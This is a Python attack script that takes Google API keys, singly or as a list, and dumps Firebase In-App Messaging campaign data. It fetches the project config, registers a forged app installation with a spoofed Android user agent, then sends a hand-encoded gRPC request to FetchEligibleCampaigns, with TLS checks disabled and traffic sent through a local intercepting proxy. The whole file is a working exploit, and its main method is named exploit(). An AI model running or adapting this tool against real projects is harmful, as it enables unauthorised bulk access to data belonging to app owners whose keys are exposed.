import requests
import binascii
import blackboxprotobuf
from Crypto.Util.number import bytes_to_long, long_to_bytes
import argparse
import json

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HTTP_PROXY = {
	"http":"http://127.0.0.1:8080",
	"https":"http://127.0.0.1:8080"
}

GOOGLE_APIS_URL = "https://www.googleapis.com"
FIREBASE_INSTALLATION_URL = "https://firebaseinstallations.googleapis.com"
FIAM_API_URL = "https://firebaseinappmessaging.googleapis.com"

class FiamCheck:
	def __init__(self, apk_key) -> None:
		self.api_key = apk_key
		self.project_id = ""
		self.project_name = ""
		self.fid = ""
		self.fid_token = ""

	def get_project_config(self):
		api = f"/identitytoolkit/v3/relyingparty/getProjectConfig?key={self.api_key}"
		HTTP_HEADERS = {
			"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; M2010J19SG MIUI/V12.0.17.0.QJQMIXM)"
		}

		r = requests.get(GOOGLE_APIS_URL + api, headers=HTTP_HEADERS, verify=False, proxies=HTTP_PROXY)
		json_res = r.json()

		try:
			self.project_id = json_res["projectId"]
			auth_domain = json_res["authorizedDomains"]
			for domain in auth_domain:
				if ".firebaseapp.com" in domain:
					self.project_name = domain.replace(".firebaseapp.com", "")
		except:
			print("[!] Cannot get project config")
			exit()
		
	def get_installation_id(self):
		api = f"/v1/projects/{self.project_name}/installations"
		json_body = {
			"fid":"d7LDG9Y4SOO7l5t7rdMgJw",
			"appId":f"1:{self.project_id}:android:eb14bfe0fc12c4d7d5e33c",
			"authVersion":"FIS_v2",
			"sdkVersion":"a:17.1.0"
		}
		HTTP_HEADERS = {
			"Content-Type": "application/json",
			"X-Goog-Api-Key": self.api_key,
			"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; M2010J19SG MIUI/V12.0.17.0.QJQMIXM)"
		}

		r = requests.post(FIREBASE_INSTALLATION_URL + api, data=json.dumps(json_body, separators=(",", ":")), headers=HTTP_HEADERS, verify=False, proxies=HTTP_PROXY)
		json_res = r.json()

		try:
			self.fid = json_res["fid"]
			self.fid_token = json_res["authToken"]["token"]
		except:
			print("[!] Cannot get installation id")
			exit()

	def fiam_check(self):
		api = "/google.internal.firebase.inappmessaging.v1.sdkserving.InAppMessagingSdkServing/FetchEligibleCampaigns"
		json_body = {
			'1': f"{self.project_id}".encode(), 
			'2': {'1': f"1:{self.project_id}:android:eb14bfe0fc12c4d7d5e33c".encode(), '2': f"{self.fid}".encode(), '3': f"{self.fid_token}".encode()}, 
			'4': {'1': b'1.0', '2': b'29', '3': {'12': 1430347630}, '4': b'Asia/Ho_Chi_Minh'}
		}
		req_type = {'1': {'type': 'bytes', 'name': ''}, '2': {'type': 'message', 'message_typedef': {'1': {'type': 'bytes', 'name': ''}, '2': {'type': 'bytes', 'name': ''}, '3': {'type': 'bytes', 'name': ''}}, 'name': ''}, '4': {'type': 'message', 'message_typedef': {'1': {'type': 'bytes', 'name': ''}, '2': {'type': 'bytes', 'name': ''}, '3': {'type': 'message', 'message_typedef': {'12': {'type': 'fixed32', 'name': ''}}, 'name': ''}, '4': {'type': 'bytes', 'name': ''}}, 'name': ''}}
		enc_req = bytes(blackboxprotobuf.encode_message(json_body, req_type))
		len_enc_req_in_byte = long_to_bytes(len(enc_req))
		enc_req = (5-len(len_enc_req_in_byte))*b'\x00' + len_enc_req_in_byte + enc_req

		HTTP_HEADERS = {
			"Content-Type": "application/grpc",
			"X-Goog-Api-Key": self.api_key,
			"User-Agent": "grpc-java-okhttp/1.50.2",
			"Te": "trailers"
		}
		
		r = requests.post(FIAM_API_URL+api, data=enc_req, proxies=HTTP_PROXY, verify=False, headers=HTTP_HEADERS)
		dump_data = r.content[5:]
		format_dump_data, res_type = blackboxprotobuf.decode_message(dump_data)
		print(format_dump_data)

	def exploit(self):
		self.get_project_config()
		self.get_installation_id()
		self.fiam_check()
	
if __name__ == "__main__":
	msg = "Firebase In-App Messaging Campaigns Dump"
	parser = argparse.ArgumentParser(description=msg)
	parser.add_argument("-ak", "--api-key", help = "Google API Key")
	parser.add_argument("-akl", "--api-key-list", help = "Google API Key")

	args = parser.parse_args()

	if args.api_key:
		fiamCheck = FiamCheck(args.api_key)
		fiamCheck.exploit()

	if args.api_key_list:
		api_key_list = open(args.api_key_list, "r").read().split("\n")
		for api_key in api_key_list:
			fiamCheck = FiamCheck(api_key)
			fiamCheck.exploit()
